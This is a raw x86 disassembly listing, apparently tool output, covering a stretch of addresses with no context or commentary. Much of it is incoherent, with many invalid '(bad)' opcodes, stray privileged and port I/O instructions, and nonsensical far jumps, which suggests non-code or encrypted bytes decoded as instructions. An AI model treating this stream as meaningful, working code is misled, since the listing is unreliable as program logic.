  4426b5:	test   BYTE PTR [ecx+0x1fc850d],bl
  4426bb:	mov    edx,0x999004
  4426c0:	(bad)  
  4426c1:	scas   al,BYTE PTR es:[edi]
  4426c2:	adc    ch,BYTE PTR [edx+0x6604928c]
  4426c8:	push   ebx
  4426c9:	pushf  
  4426ca:	cdq    
  4426cb:	or     eax,0x2d
  4426d0:	add    BYTE PTR [eax],al
  4426d2:	es pop ebx
  4426d4:	push   0x5a
  4426d6:	dec    eax
  4426d7:	adc    edi,DWORD PTR [edi+0x4ab309fb]
  4426dd:	dec    esp
  4426de:	xchg   esi,eax
  4426df:	mov    DWORD PTR [edx],ecx
  4426e1:	push   es
  4426e2:	nop
  4426e3:	mov    dl,0xf0
  4426e5:	jle    0x442744
  4426e7:	mov    cl,0xf7
  4426e9:	add    ecx,DWORD PTR [ebx]
  4426eb:	daa    
  4426ec:	pop    edi
  4426ed:	mov    al,0x8c
  4426ef:	mov    dl,0xf7
  4426f1:	jp     0x442735
  4426f3:	xchg   BYTE PTR [ebp+0xf],bl
  4426f6:	out    0x8f,al
  4426f8:	neg    DWORD PTR [edi+ecx*8]
  4426fb:	mov    bl,0x9d
  4426fd:	jnp    0x442741
  4426ff:	sahf   
  442700:	pop    esi
  442701:	mov    edi,0xbf6c22bf
  442706:	ret    
  442707:	cmp    esp,esi
  442709:	add    BYTE PTR [ecx],al
  44270b:	inc    DWORD PTR [esi+eax*1-0x77]
  44270f:	inc    edi
  442710:	cmp    edi,DWORD PTR [ebp-0x53]
  442713:	repnz pushf 
  442715:	inc    eax
  442716:	sub    DWORD PTR [eax+0x39c87d31],edi
  44271c:	retf   0x314b
  44271f:	cmp    DWORD PTR [ebx-0x5533728c],edi
  442725:	pop    ebx
  442726:	or     al,bh
  442728:	ins    BYTE PTR es:[edi],dx
  442729:	iret   
  44272a:	jae    0x442744
  44272c:	push   ecx
  44272d:	mov    bh,cl
  44272f:	into   
  442730:	fadd   QWORD PTR [ebx]
  442732:	nop
  442733:	ret    
  442734:	sub    DWORD PTR ds:0x0,ecx
  44273a:	add    BYTE PTR [ecx+0xe],al
  44273d:	out    dx,al
  44273e:	jl     0x4427ad
  442740:	fisttp DWORD PTR [eax]
  442742:	jge    0x44271e
  442744:	xchg   edx,eax
  442745:	pop    esp
  442746:	sbb    BYTE PTR [ecx],al
  442748:	mov    edi,0xb3151048
  44274d:	or     DWORD PTR [ecx],eax
  44274f:	jmp    0xefc01dd2
  442754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442755:	test   DWORD PTR [ebx],0x150efd15
  44275b:	vmread DWORD PTR [edx-0x27],esp
  44275f:	nop
  442760:	inc    ecx
  442761:	inc    edx
  442762:	js     0x4426f1
  442764:	(bad)  
  442765:	ret    
  442766:	out    dx,al
  442767:	xor    BYTE PTR [edx+0xf],ah
  44276a:	jns    0x442793
  44276c:	mov    eax,ds:0xc7ce90e
  442771:	jmp    0x4427e5
  442773:	fiadd  WORD PTR [esi-0x4cb7db73]
  442779:	jmp    0x9b4897a2
  44277e:	cmp    DWORD PTR fs:[edx-0x4d6c526e],edi
  442785:	push   cs
  442786:	ins    BYTE PTR es:[edi],dx
  442787:	pop    ds
  442788:	pop    es
  442789:	sub    esp,edx
  44278b:	xchg   ebx,eax
  44278c:	mov    dl,0x95
  44278e:	sbb    al,0x60
  442790:	clc    
  442791:	jo     0x4427fd
  442793:	pop    es
  442794:	imul   DWORD PTR [edx]
  442796:	repnz xchg ebx,eax
  442798:	mov    dl,0xe
  44279a:	fs pop ds
  44279c:	imul   DWORD PTR [edx]
  44279e:	loop   0x4427a0
  4427a0:	add    BYTE PTR [eax],al
  4427a2:	add    BYTE PTR [eax],al
  4427a4:	xchg   ebx,eax
  4427a5:	mov    dl,0x63
  4427a7:	clc    
  4427a8:	push   ss
  4427a9:	push   ebx
  4427aa:	xor    ch,cl
  4427ac:	xchg   ebx,eax
  4427ad:	mov    dl,0xe
  4427af:	push   0xffffffe5
  4427b1:	(bad)  
  4427b2:	push   esi
  4427b3:	(bad)  
  4427b4:	adc    al,0xc8
  4427b6:	push   cs
  4427b7:	mov    ebp,0x658e13d9
  4427bc:	sub    ecx,esp
  4427be:	adc    eax,0xa78c93e9
  4427c3:	ror    BYTE PTR cs:[ebp+0x26928fe9],0x56
  4427cb:	fisttp QWORD PTR [esi+ecx*4-0x17]
  4427cf:	bound  eax,QWORD PTR [ebp+0x14de1013]
  4427d5:	pushf  
  4427d6:	or     al,0x0
  4427d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4427d9:	jmp    0x442841
  4427db:	mov    bh,0xa2
  4427dd:	inc    esp
  4427de:	in     eax,0x85
  4427e0:	mov    esp,DWORD PTR [ebp+0x74]
  4427e3:	mov    DWORD PTR [ebp+ebp*8+0xf6eb716],ebp
  4427ea:	gs hlt 
  4427ec:	je     0x4427eb
  4427ee:	pop    ebp
  4427ef:	push   esp
  4427f0:	jb     0x442865
  4427f2:	stc    
  4427f3:	lea    esp,ds:0xe90b460f
  4427f9:	mov    cl,0x95
  4427fb:	fwait
  4427fc:	stc    
  4427fd:	mov    cl,0xe
  4427ff:	add    BYTE PTR [edx+0x4c],dh
  442802:	in     eax,0xff
  442804:	jl     0x4427ec
  442806:	push   0xffffffee
  442808:	add    BYTE PTR [eax],al
  44280a:	add    BYTE PTR [eax],al
  44280c:	add    ch,ah
  44280e:	push   cs
  44280f:	pop    ebp
  442810:	loopne 0x4427c4
  442812:	jb     0x442805
  442814:	jg     0x4427e4
  442816:	mov    WORD PTR [esi-0x6a4fcd84],ds
  44281c:	je     0x442860
  44281e:	mov    al,0x23
  442820:	cli    
  442821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442822:	sahf   
  442823:	xchg   edx,eax
  442824:	fcmovbe st,st(2)
  442826:	fcom   QWORD PTR [edx-0x3ebccd05]
  44282c:	psadbw mm6,QWORD PTR [edx-0xe1f06d]
  442833:	call   0xe9c839ef
  442838:	call   DWORD PTR [edi+0xe]
  44283b:	add    bh,bh
  44283d:	cmp    al,0xe5
  44283f:	xchg   edx,eax
  442840:	jge    0x4427e7
  442842:	or     DWORD PTR [ebp-0x20],ebx
  442845:	hlt    
  442846:	std    
  442847:	pop    esp
  442848:	mov    esp,0x83f563f2
  44284d:	jle    0x4427ff
  44284f:	push   eax
  442850:	mov    DWORD PTR [ebp*8+0x4490965c],ebp
  442857:	mov    ebx,0x9fb60b54
  44285c:	mov    esp,0xcb4ec744
  442861:	pop    esp
  442862:	fisttp WORD PTR [esi-0x35]
  442865:	push   esp
  442866:	cs fs jmp 0x44287d
  44286a:	(bad)  
  44286b:	fisttp QWORD PTR [esi+edi*4-0x34]
  44286f:	test   BYTE PTR gs:[eax],0x0
  442873:	add    BYTE PTR [eax],al
  442875:	add    BYTE PTR [ebx],bl
  442877:	jae    0x442861
  442879:	mov    al,0x4f
  44287b:	cdq    
  44287c:	cld    
  44287d:	int    0xd7
  44287f:	aad    0x5a
  442881:	clc    
  442882:	div    DWORD PTR [ebx+0x58]
  442885:	xchg   BYTE PTR [ebp+0x4b],dl
  442888:	mov    es,WORD PTR [ebp-0x71]
  44288b:	push   ss
  44288c:	rol    BYTE PTR [ebx],0x15
  44288f:	pop    ebx
  442890:	mov    BYTE PTR [edi],0x19
  442893:	add    DWORD PTR [esi],ecx
  442895:	add    BYTE PTR [eax-0x341e2],dl
  44289b:	and    ebx,DWORD PTR [eax-0x1]
  44289e:	mov    edi,0x17436bb4
  4428a3:	popf   
  4428a4:	xchg   esi,eax
  4428a5:	aam    0x9f
  4428a7:	add    ebx,DWORD PTR [esi-0x1]
  4428aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4428ab:	call   0x7a6b:0xd896c08c
  4428b2:	xchg   esp,eax
  4428b3:	(bad)  
  4428b4:	mov    esi,0x414f1907
  4428b9:	test   ch,ah
  4428bb:	jmp    0x5f4fe524
  4428c0:	pop    ecx
  4428c1:	or     BYTE PTR [edi],bh
  4428c3:	xchg   ecx,eax
  4428c4:	iret   
  4428c5:	xor    al,0x41
  4428c7:	dec    edi
  4428c8:	adc    DWORD PTR ds:0x34f34e53,esi
  4428ce:	inc    esi
  4428cf:	pop    edi
  4428d0:	out    0x61,eax
  4428d2:	xchg   ecx,eax
  4428d3:	mov    dl,0x6b
  4428d5:	xchg   bl,cl
  4428d7:	mov    eax,0x3f7
  4428dc:	add    BYTE PTR [eax],al
  4428de:	add    BYTE PTR ds:0xc3437adc,ch
  4428e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4428e5:	mov    esp,0xe0073fc8
  4428ea:	in     eax,0x28
  4428ec:	aaa    
  4428ed:	jo     0x4428be
  4428ef:	lea    esi,[edx+0x3418e5f7]
  4428f5:	cmp    edi,ecx
  4428f7:	pop    ss
  4428f8:	mov    WORD PTR [edi+esi*8-0x33227774],?
  4428ff:	mov    ss,WORD PTR [ecx+eax*8]
  442902:	test   DWORD PTR [edi],edi
  442904:	mov    ecx,0xb3ed03f7
  442909:	pop    ecx
  44290a:	dec    ebp
  44290b:	adc    BYTE PTR [edi-0x23],dh
  44290e:	add    edx,DWORD PTR [eax+0x527b85bf]
  442914:	mov    dh,BYTE PTR [edx+0x29]
  442917:	bound  edi,QWORD PTR [eax-0x74308592]
  44291d:	idiv   DWORD PTR [esi+0x35]
  442920:	scas   eax,DWORD PTR es:[edi]
  442921:	mov    esi,?
  442923:	test   BYTE PTR [edi+0x2],ch
  442926:	cli    
  442927:	(bad)  
  442928:	mov    ah,0xf7
  44292a:	add    edx,DWORD PTR [eax-0x53b119c3]
  442930:	mov    edx,0xb290051e
  442935:	idiv   DWORD PTR [esi+0x26]
  442938:	lea    esi,[edi+eax*8-0x75]
  44293c:	mov    dh,0x48
  44293e:	mov    edi,0xad780583
  442943:	add    BYTE PTR [eax],al
  442945:	add    BYTE PTR [eax],al
  442947:	add    cl,bl
  442949:	out    0x6c,eax
  44294b:	fisubr DWORD PTR [bx+0x23]
  44294f:	inc    eax
  442950:	pop    ebx
  442951:	jle    0x44298e
  442953:	inc    eax
  442954:	pop    ebx
  442955:	jle    0x442965
  442957:	pushf  
  442958:	fcom   DWORD PTR [edi-0x19fc273]
  44295e:	inc    eax
  44295f:	jb     0x442943
  442961:	mov    edx,0xdd91bfa1
  442966:	mov    esp,0xd184b8be
  44296b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44296c:	xlat   BYTE PTR ds:[ebx]
  44296d:	mov    ch,cl
  44296f:	push   es
  442970:	fnsave [ebx+ecx*2]
  442973:	cmc    
  442974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442975:	cmc    
  442976:	adc    DWORD PTR [esi],ebp
  442978:	push   edi
  442979:	adc    DWORD PTR [edx],0xffffffe9
  44297c:	xchg   ebx,eax
  44297d:	mov    dl,0x93
  44297f:	ret    0xb6e6
  442982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442983:	jae    0x442918
  442985:	mov    dl,0xe
  442987:	scas   al,BYTE PTR es:[edi]
  442988:	(bad)  
  442989:	or     BYTE PTR ds:0x93b293e9,0xc6
  442990:	in     al,dx
  442991:	xor    ah,BYTE PTR [ebx]
  442993:	in     al,0x93
  442995:	mov    dl,0x8d
  442997:	scas   eax,DWORD PTR es:[edi]
  442998:	xchg   ebp,eax
  442999:	icebp  
  44299a:	xchg   edi,eax
  44299b:	xor    al,0x3c
  44299d:	xor    al,0x6b
  44299f:	xchg   ecx,eax
  4429a0:	sbb    BYTE PTR [ecx+ebp*8-0x16ca6c17],cl
  4429a7:	(bad)  
  4429a8:	into   
  4429a9:	call   0x0:0x5619
  4429b0:	add    BYTE PTR [ebp+esi*1+0x7d907d63],al
  4429b7:	xchg   edi,eax
  4429b8:	hlt    
  4429b9:	das    
  4429ba:	xor    al,0x6b
  4429bc:	jge    0x4429d8
  4429be:	loopne 0x4429aa
  4429c0:	mov    dl,0x62
  4429c2:	or     BYTE PTR [edi],dl
  4429c4:	and    ah,ch
  4429c6:	mov    edx,0xb28f5692
  4429cb:	push   cs
  4429cc:	adc    al,BYTE PTR [edi-0x7e]
  4429cf:	sbb    DWORD PTR [esi+ebp*1-0x76],ebx
  4429d3:	jmp    0xae4da2d8
  4429d8:	and    al,0x79
  4429da:	mov    dh,0xe
  4429dc:	add    BYTE PTR [esi+0x1f],dh
  4429df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4429e0:	mov    al,0x27
  4429e2:	mov    ecx,gs
  4429e4:	inc    edx
  4429e6:	or     eax,0xb63916a6
  4429eb:	mov    al,ds:0xeb62910
  4429f0:	sub    edi,DWORD PTR [esi-0x46]
  4429f3:	sar    BYTE PTR [esi-0xc],1
  4429f6:	xchg   BYTE PTR [esi+0x137969b4],bl
  4429fc:	add    BYTE PTR [ecx],ch
  4429fe:	nop
  4429ff:	xchg   edx,eax
  442a00:	(bad)  
  442a01:	(bad)  
  442a03:	retf   
  442a04:	mov    eax,ecx
  442a06:	xchg   BYTE PTR [edi+0x9],ch
  442a09:	mov    DWORD PTR [esi],esi
  442a0b:	(bad)  
  442a0c:	(bad)  
  442a0d:	jmp    0x21dcc99e
  442a12:	test   ecx,ebp
  442a14:	inc    DWORD PTR [eax]
  442a16:	add    BYTE PTR [eax],al
  442a18:	add    BYTE PTR [eax],al
  442a1a:	bound  edi,QWORD PTR [esi]
  442a1c:	std    
  442a1d:	xchg   ebp,eax
  442a1f:	jle    0x442a07
  442a21:	inc    eax
  442a22:	mov    ebp,0x60989f8c
  442a27:	test   cl,ch
  442a29:	inc    DWORD PTR [edx+0x46]
  442a2c:	std    
  442a2d:	mov    cl,BYTE PTR [ecx-0x47e36e7a]
  442a33:	or     BYTE PTR [edx+0xeb5bfbc],bl
  442a39:	mov    cl,0xc9
  442a3b:	cmp    al,ch
  442a3d:	(bad)  
  442a3e:	mov    ecx,0xbd57e9b5
  442a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442a44:	shl    BYTE PTR [esi-0x6],1
  442a47:	in     al,dx
  442a48:	xchg   esp,eax
  442a49:	dec    esp
  442a4a:	mov    bl,0xde
  442a4c:	outs   dx,DWORD PTR ds:[esi]
  442a4d:	mov    DWORD PTR [ecx],ebp
  442a4f:	ss (bad) 
  442a51:	call   DWORD PTR [eax+0x6c72689b]
  442a57:	hlt    
  442a58:	fisub  WORD PTR [ecx+0x1b]
  442a5b:	out    0x82,eax
  442a5d:	jnp    0x4429f9
  442a5f:	fwait
  442a60:	or     eax,0xecfd4362
  442a65:	push   es
  442a66:	add    BYTE PTR [ebx],al
  442a68:	(bad)  
  442a6a:	dec    edi
  442a6b:	pushf  
  442a6c:	and    al,0x26
  442a6e:	in     eax,0xa7
  442a70:	imul   eax,DWORD PTR [edi+0xd88fc],0xffffff87
  442a77:	push   cs
  442a78:	out    dx,al
  442a79:	clc    
  442a7a:	das    
  442a7b:	mov    al,0x4b
  442a7d:	push   cs
  442a7e:	add    BYTE PTR [eax],al
  442a80:	add    BYTE PTR [eax],al
  442a82:	add    BYTE PTR [ebx+ebx*4-0x6fd97cf3],cl
  442a89:	imul   eax,esp,0x350d9b91
  442a8f:	test   DWORD PTR [edi-0x1c],ebx
  442a92:	cmp    DWORD PTR [edx],0xffffff9b
  442a95:	or     eax,0x61288f00
  442a9a:	scas   eax,DWORD PTR es:[edi]
  442a9b:	jbe    0x442a32
  442a9d:	or     eax,0xd6b2f00
  442aa2:	add    BYTE PTR [eax+0x4d865ba4],dl
  442aa8:	inc    ebx
  442aa9:	push   0xd611487
  442aae:	add    BYTE PTR [ebx-0x689828c0],cl
  442ab4:	loopne 0x442b2f
  442ab6:	scas   eax,DWORD PTR es:[edi]
  442ab7:	cmp    al,0x95
  442ab9:	or     eax,0x46be0900
  442abe:	popa   
  442abf:	ret    
  442ac0:	cmp    al,0x68
  442ac2:	inc    edi
  442ac3:	cwde   
  442ac4:	add    cl,bh
  442ac6:	jecxz  0x442afe
  442ac8:	xchg   edx,eax
  442ac9:	pop    ebp
  442aca:	mov    bh,0x7e
  442acc:	fwait
  442acd:	or     eax,0xebb2e085
  442ad2:	jge    0x442adb
  442ad4:	dec    ebx
  442ad5:	loope  0x442ada
  442ad7:	nop
  442ad8:	cmp    bh,bl
  442ada:	hlt    
  442adb:	or     al,0xee
  442add:	push   ebx
  442ade:	add    al,0xc8
  442ae0:	sahf   
  442ae1:	pop    esp
  442ae2:	retf   
  442ae3:	cmp    DWORD PTR [ebx],0xffffff9f
  442ae6:	sti    
  442ae7:	add    BYTE PTR [eax],al
  442ae9:	add    BYTE PTR [eax],al
  442aeb:	add    BYTE PTR ds:0x57f15e23,dl
  442af1:	mov    BYTE PTR [edi-0x11],ch
  442af4:	cwde   
  442af5:	cmp    esp,DWORD PTR [edi-0x79]
  442af8:	mov    eax,ds:0xba7ef7b2
  442afd:	xchg   esi,eax
  442afe:	imul   BYTE PTR [ebx+0x1de741a3]
  442b04:	push   esi
  442b05:	adc    DWORD PTR ds:0xff60c5a,eax
  442b0b:	js     0x442ad0
  442b0d:	mov    esp,0x47077be7
  442b12:	rol    DWORD PTR [ebx],0x90
  442b15:	cmp    ebp,DWORD PTR [edx]
  442b17:	dec    eax
  442b18:	jno    0x442b53
  442b1a:	scas   eax,DWORD PTR es:[edi]
  442b1b:	mov    WORD PTR [ecx-0x69a3084e],fs
  442b21:	adc    BYTE PTR [ebp-0x78],ch
  442b24:	aas    
  442b25:	pop    es
  442b26:	fiadd  WORD PTR [ebx]
  442b28:	nop
  442b29:	adc    BYTE PTR [ebp+0x633b1461],al
  442b2f:	repnz xlat BYTE PTR ds:[ebx]
  442b31:	xchg   DWORD PTR [ecx-0x5],edx
  442b34:	pop    es
  442b35:	dec    ebx
  442b36:	jmp    0x3af7bb3e
  442b3b:	dec    esp
  442b3c:	push   ss
  442b3d:	cmp    eax,DWORD PTR [ebx-0xe]
  442b40:	mov    bh,0x87
  442b42:	int3   
  442b43:	xor    al,0x16
  442b45:	ficom  WORD PTR [ebx+0x293ae0f9]
  442b4b:	(bad)  
  442b4c:	lahf   
  442b4d:	xchg   DWORD PTR [esi],ecx
  442b4f:	add    BYTE PTR ss:[eax],al
  442b52:	add    BYTE PTR [eax],al
  442b54:	add    BYTE PTR [edi+eax*4+0x7face9e9],bl
  442b5b:	xchg   edi,eax
  442b5c:	mov    ah,0xdb
  442b5e:	cs xchg esi,eax
  442b60:	popf   
  442b61:	add    BYTE PTR [edi+0x9b912e9],0x72
  442b68:	fiadd  WORD PTR [eax]
  442b6a:	aaa    
  442b6b:	stos   BYTE PTR es:[edi],al
  442b6c:	repz xchg ebx,eax
  442b6e:	mov    dl,0x97
  442b70:	xchg   esp,eax
  442b71:	(bad)  
  442b72:	adc    DWORD PTR [esi+0x16efd54b],edi
  442b78:	pusha  
  442b79:	setae  BYTE PTR [eax-0x10]
  442b7d:	ret    
  442b7e:	aas    
  442b7f:	add    cl,ch
  442b81:	xchg   ebx,eax
  442b82:	sub    eax,0x7b5fd3e
  442b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442b88:	not    DWORD PTR [ebx+0x22ed96b2]
  442b8e:	cs push ebx
  442b90:	add    eax,0x6202ea93
  442b95:	inc    esp
  442b96:	mov    ds:0x2d0ba195,eax
  442b9b:	jle    0x442b3d
  442b9d:	add    DWORD PTR [edi-0x46108e17],eax
  442ba3:	xchg   ebp,eax
  442ba4:	jns    0x442bb5
  442ba6:	mov    eax,ds:0xc6ce90e
  442bab:	sti    
  442bac:	call   0xd9e3ceec
  442bb1:	jge    0x442c23
  442bb3:	jo     0x442b4f
  442bb5:	cmp    BYTE PTR [esi],ch
  442bb7:	pop    ebx
  442bb8:	mov    cl,0x0
  442bba:	add    BYTE PTR [eax],al
  442bbc:	add    BYTE PTR [eax],al
  442bbe:	inc    esi
  442bbf:	jecxz  0x442bd5
  442bc1:	cdq    
  442bc2:	dec    edx
  442bc3:	aaa    
  442bc4:	stos   BYTE PTR es:[edi],al
  442bc5:	not    DWORD PTR [ebx+0x483c95b2]
  442bcb:	adc    DWORD PTR [eax+0xea11b51],ebx
  442bd1:	add    BYTE PTR [ecx+0x226603e5],bh
  442bd7:	cmp    esp,DWORD PTR [ebp+0x6cb2a90a]
  442bdd:	rcl    DWORD PTR [esi],cl
  442bdf:	xchg   esp,eax
  442be0:	adc    BYTE PTR [eax-0x167bcf],bh
  442be6:	push   0x3d
  442be8:	loope  0x442b73
  442bea:	icebp  
  442beb:	sub    eax,0x779ffff
  442bf0:	xchg   edx,eax
  442bf1:	mov    esp,0x830eb247
  442bf6:	stos   DWORD PTR es:[edi],eax
  442bf7:	in     al,dx
  442bf8:	push   0xfffffff9
  442bfa:	outs   dx,DWORD PTR ds:[esi]
  442bfb:	jl     0x442c42
  442bfd:	mov    DWORD PTR [esi+ebx*8],esp
  442c00:	outs   dx,DWORD PTR ds:[esi]
  442c01:	rcr    DWORD PTR [ebx-0x3ff7adfa],cl
  442c07:	inc    esp
  442c08:	in     eax,dx
  442c09:	data16 xor BYTE PTR [edx],al
  442c0c:	mov    ds:0x93b23916,al
  442c11:	push   eax
  442c12:	inc    ebp
  442c13:	or     BYTE PTR [edx-0x48],ch
  442c16:	inc    edi
  442c17:	mov    dl,0xe
  442c19:	mov    BYTE PTR ds:0x95459281,ah
  442c1f:	mov    al,0x46
  442c21:	adc    al,0x0
  442c23:	add    BYTE PTR [eax],al
  442c25:	add    BYTE PTR [eax],al
  442c27:	xor    BYTE PTR [esi-0x3],0x89
  442c2b:	jns    0x442c64
  442c2d:	(bad)  
  442c2e:	(bad)  
  442c2f:	jmp    0x714c7e3c
  442c34:	adc    BYTE PTR [esi],0x8b
  442c37:	dec    ecx
  442c38:	cmp    bh,bh
  442c3a:	(bad)  
  442c3b:	jmp    0xe9309148
  442c40:	pop    ecx
  442c41:	std    
  442c42:	mov    al,0xe9
  442c44:	stos   DWORD PTR es:[edi],eax
  442c45:	shl    BYTE PTR [esi+0xa],1
  442c48:	fisubr WORD PTR [edx-0x3e]
  442c4b:	sbb    ecx,DWORD PTR [eax]
  442c4d:	call   0x3600:0xd8590bc
  442c54:	adc    bl,BYTE PTR [ebx+0xd9b7eb7]
  442c5a:	out    0x40,eax
  442c5c:	cdq    
  442c5d:	or     eax,0x6c282e00
  442c62:	popa   
  442c63:	cdq    
  442c64:	jmp    0x442c00
  442c66:	adc    DWORD PTR [eax-0x6d417365],edx
  442c6c:	loop   0x442c88
  442c6e:	(bad)  
  442c6f:	ja     0x442c0c
  442c71:	nop
  442c72:	seto   BYTE PTR [ebx-0x7e9582f3]
  442c79:	loopne 0x442c03
  442c7b:	jns    0x442c17
  442c7d:	or     eax,0x6b048700
  442c82:	mov    ebp,0x250d9b9a
  442c87:	dec    ecx
  442c88:	add    ch,BYTE PTR [eax+0xf7]
  442c8e:	add    BYTE PTR [eax],al
  442c90:	or     eax,DWORD PTR [ebx]
  442c92:	xchg   edi,eax
  442c93:	adc    DWORD PTR [eax-0x5136eb65],edx
  442c99:	sub    al,0xe0
  442c9b:	mov    al,0x0
  442c9d:	fnsetpm(287 only) 
  442c9f:	call   FWORD PTR [edi]
  442ca1:	add    ah,BYTE PTR [eax+0x6ca8aeeb]
  442ca7:	test   BYTE PTR [eax-0x6d],bl
  442caa:	push   0x42
  442cac:	in     al,dx
  442cad:	hlt    
  442cae:	jmp    0x442c3f
  442cb0:	cmp    BYTE PTR [ebp+0xd],bh
  442cb3:	add    BYTE PTR [ebx],cl
  442cb5:	retf   
  442cb6:	fiadd  WORD PTR [ebp-0x4dcf0]
  442cbc:	out    0x2,eax
  442cbe:	jmp    0x3ffe:0x6ece0b0e
  442cc5:	addr16 fs ja 0x442c6d
  442cc9:	adc    BYTE PTR [esi+0x67b21a07],ah
  442ccf:	mov    WORD PTR [ecx-0x5c84084e],fs
  442cd5:	mov    ch,0x6c
  442cd7:	jae    0x442cc4
  442cd9:	fwait
  442cda:	test   DWORD PTR [ebx],0x484070d
  442ce0:	cmp    BYTE PTR [esi+0x786df326],bl
  442ce6:	sbb    DWORD PTR [ebx],esi
  442ce8:	js     0x442d22
  442cea:	or     cl,BYTE PTR [edx+ebx*1-0x21]
  442cee:	fst    QWORD PTR [ebx+0x16]
  442cf1:	and    ecx,DWORD PTR [ebx+0xed]
  442cf7:	add    BYTE PTR [eax],al
  442cf9:	ja     0x442c7f
  442cfb:	ins    BYTE PTR es:[edi],dx
  442cfc:	mov    al,0x6b
  442cfe:	or     eax,0x9d1f8b6f
  442d03:	test   DWORD PTR [ebx],0x7ad1d375
  442d09:	pop    ds
  442d0a:	jae    0x442cf9
  442d0c:	add    edx,DWORD PTR [eax+0xc5e050c]
  442d12:	cmp    esi,DWORD PTR [ebx-0x13]
  442d15:	aas    
  442d16:	test   BYTE PTR [ecx-0x16b50004],dl
  442d1c:	add    edx,DWORD PTR [eax+0xe4b8aaf]
  442d22:	cmp    edx,DWORD PTR [ebx-0x13]
  442d25:	pop    ds
  442d26:	test   BYTE PTR [ebx+edi*2-0x25],bl
  442d2a:	pushf  
  442d2b:	test   DWORD PTR [ebx],0x81fa708d
  442d31:	(bad)  
  442d32:	mov    ch,0x71
  442d34:	test   al,0x16
  442d36:	(bad)  
  442d38:	faddp  st(4),st
  442d3a:	nop
  442d3b:	ins    BYTE PTR es:[edi],dx
  442d3c:	mov    esp,0x60323997
  442d41:	jno    0x442cfc
  442d43:	inc    edi
  442d44:	mov    WORD PTR [ecx+0x4778f7b2],es
  442d4a:	sahf   
  442d4b:	push   cs
  442d4c:	arpl   WORD PTR [esp+edi*1],dx
  442d4f:	add    cl,ch
  442d51:	xchg   ebx,eax
  442d52:	cmp    dl,BYTE PTR [edx]
  442d54:	clc    
  442d55:	cmp    al,dh
  442d57:	bnd call 0x11d9cd48
  442d5d:	add    BYTE PTR [eax],al
  442d5f:	add    BYTE PTR [eax],al
  442d61:	add    BYTE PTR [eax-0x49af81d3],ah
  442d67:	sub    ecx,0x72
  442d6a:	fsubr  QWORD PTR [ebx+0x2e9cd596]
  442d70:	jle    0x442da7
  442d72:	jle    0x442cf7
  442d74:	jmp    0xfdb7cdb
  442d79:	shr    DWORD PTR [edi+0x54],0xfe
  442d7d:	adc    bh,BYTE PTR [edx+0x1146be11]
  442d83:	inc    ebp
  442d84:	frstor [eax-0x24]
  442d87:	inc    edi
  442d88:	add    cl,ch
  442d8a:	xchg   ebx,eax
  442d8b:	adc    BYTE PTR [eax+0xea10481],bl
  442d91:	jmp    0xe953fa80
  442d96:	xchg   ebx,eax
  442d97:	adc    BYTE PTR [esi+0x7eac5e0b],bh
  442d9d:	popa   
  442d9e:	es sub ecx,0x6a
  442da2:	rol    DWORD PTR [esi-0x4d6d070a],cl
  442da8:	push   cs
  442da9:	test   BYTE PTR [ebx+ebp*1],0xd0
  442dad:	repz xchg ebx,eax
  442daf:	mov    dl,0x35
  442db1:	lock mov bh,al
  442db4:	out    0x62,al
  442db6:	test   BYTE PTR [edi+0x0],al
  442db9:	jmp    0x601deb51
  442dbe:	aad    0xb9
  442dc0:	mov    eax,ds:0xeadaf79
  442dc5:	jmp    0x442dca
  442dca:	add    BYTE PTR [edx-0x20],ch
  442dcd:	cli    
  442dce:	add    BYTE PTR [edi-0x3f],cl
  442dd1:	retf   
  442dd2:	mov    esp,DWORD PTR [ecx-0x22ba6f7a]
  442dd8:	adc    BYTE PTR fs:[eax-0x166abf],dl
  442ddf:	inc    edx
  442de0:	aas    
  442de1:	std    
  442de2:	mov    DWORD PTR [ecx],ebp
  442de4:	aaa    
  442de5:	(bad)  
  442de6:	(bad)  
  442de7:	mov    ecx,0x32110e06
  442dec:	inc    esp
  442ded:	in     eax,dx
  442dee:	add    DWORD PTR [ecx-0x7e],esi
  442df1:	xchg   edx,eax
  442df2:	js     0x442db1
  442df4:	or     DWORD PTR [edx+0x8],edx
  442df7:	repz add eax,0xb67916a1
  442dfd:	xchg   esi,eax
  442dfe:	adc    al,0x86
  442e00:	sti    
  442e01:	cdq    
  442e02:	mov    esp,0x8b0eb67f
  442e07:	inc    esp
  442e08:	jmp    0x2a19:0x255d57e8
  442e0f:	mov    ds:0xe2efda5f,eax
  442e14:	dec    eax
  442e15:	loope  0x442da4
  442e17:	sub    eax,0xe989f97c
  442e1c:	cmp    edi,edi
  442e1e:	jmp    FWORD PTR [ecx]
  442e20:	sti    
  442e21:	cmp    al,0xfc
  442e23:	paddw  mm4,QWORD PTR [ecx+0xeb62fb8]
  442e2a:	jmp    0x442e85
  442e2c:	pusha  
  442e2d:	xchg   edx,eax
  442e2e:	mov    eax,0x0
  442e33:	add    BYTE PTR [ebp+0x7b],ch
  442e36:	jmp    0xef073e3a
  442e3b:	mov    esi,DWORD PTR [ecx+0x39]
  442e3e:	(bad)  
  442e3f:	(bad)  
  442e40:	stc    
  442e41:	pop    edi
  442e42:	adc    BYTE PTR [eax+0xe9d31],bh
  442e48:	jmp    0x8f13:0x9089e162
  442e4f:	adc    DWORD PTR [eax+0x1c87988b],edx
  442e55:	bound  ecx,QWORD PTR ds:0x274e1300
  442e5b:	jl     0x442e26
  442e5d:	xchg   edx,eax
  442e5e:	iret   
  442e5f:	push   esi
  442e60:	sbb    DWORD PTR [edi+0x2de3611e],esp
  442e66:	cdq    
  442e67:	inc    edi
  442e68:	mov    BYTE PTR [edx],al
  442e6a:	fsub   st,st(3)
  442e6c:	ss xchg edx,eax
  442e6e:	jge    0x442e27
  442e70:	jle    0x442dfd
  442e72:	or     eax,0x9b5f4085
  442e77:	jg     0x442e51
  442e79:	imul   ecx,DWORD PTR ds:0x28f1800,0x1337cd85
  442e83:	pop    eax
